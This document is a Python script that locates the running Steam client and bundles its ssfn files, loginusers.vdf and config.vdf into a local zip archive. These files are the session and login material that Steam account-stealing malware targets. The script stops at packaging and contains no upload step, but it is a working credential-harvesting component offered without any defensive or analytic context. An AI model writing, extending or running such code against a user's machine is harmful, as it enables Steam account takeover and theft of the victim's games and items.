import psutil
import os
import zipfile
import logging

def SteamProcessLocator():
    """
    Locates the Steam process and returns the path to the Steam client.

    Returns:
        str: The path to the Steam client, or None if the process is not found.
    """
    try:
        for process in psutil.process_iter(['name', 'exe']):
            if process.info['name'] == 'Steam':
                return os.path.dirname(process.info['exe'])
        return None
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
        logging.error(f"Error finding Steam process: {e}")
        return None

def collect_steam_files(steam_path):
    """
    Collects specific Steam files from the given path.

    Args:
        steam_path (str): The path to the Steam client.

    Returns:
        list: A list of file paths to be included in the archive.
    """
    files_to_collect = []
    if not steam_path:
        return files_to_collect

    # Collect ssfn files
    for filename in os.listdir(steam_path):
        if filename.startswith("ssfn") :
            filepath = os.path.join(steam_path, filename)
            if os.path.isfile(filepath):
                files_to_collect.append(filepath)

    # Collect config files
    config_dir = os.path.join(steam_path, "config")
    if os.path.isdir(config_dir):
        loginusers_path = os.path.join(config_dir, "loginusers.vdf")
        config_path = os.path.join(config_dir, "config.vdf")

        if os.path.isfile(loginusers_path):
            files_to_collect.append(loginusers_path)
        if os.path.isfile(config_path):
            files_to_collect.append(config_path)

    return files_to_collect

def create_steam_archive(steam_path, files_to_collect):
    """
    Creates a zip archive of the collected Steam files.

    Args:
        steam_path (str): The path to the Steam client.
        files_to_collect (list): A list of file paths to be included in the archive.
    """
    if not steam_path:
        print("Steam path not found. Archive not created.")
        return

    if not files_to_collect:
        print("No files to archive.")
        return

    archive_name = "steam.zip"
    try:
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files_to_collect:
                zipf.write(file, os.path.relpath(file, steam_path))  # Store relative path in archive
        print(f"Steam archive created: {archive_name}")
    except Exception as e:
        logging.error(f"Error creating Steam archive: {e}")

if __name__ == '__main__':
    steam_path = SteamProcessLocator()
    if steam_path:
        print(f"Steam path found: {steam_path}")
        files_to_collect = collect_steam_files(steam_path)
        if files_to_collect:
            print("Files to collect:")
            for file in files_to_collect:
                print(f"- {file}")
            create_steam_archive(steam_path, files_to_collect)
        else:
            print("No specific files found to collect.")
    else:
        print("Steam process not found.")
